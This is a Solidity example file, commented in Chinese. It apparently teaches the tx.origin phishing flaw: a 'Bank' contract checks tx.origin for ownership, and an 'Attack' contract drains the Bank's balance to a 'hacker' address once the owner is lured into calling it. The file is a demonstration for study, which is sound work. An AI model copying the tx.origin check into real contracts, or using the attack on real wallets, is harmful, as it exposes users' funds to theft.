// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract Bank {
    address public owner;//记录合约的拥有者

    //在创建合约时给 owner 变量赋值
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        //检查消息来源
        require(tx.origin == owner, "Not owner");
        //转账ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    // 受益者地址
    address payable public hacker;
    // Bank合约地址
    Bank bank;

    constructor(Bank _bank) {
        //强制将address类型的_bank转换为Bank类型
        bank = Bank(_bank);
        //将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        //诱导Bank合约的owner调用，于是Bank合约内的余额就全部转移到黑客地址中
        bank.transfer(hacker, address(bank).balance);
    }
}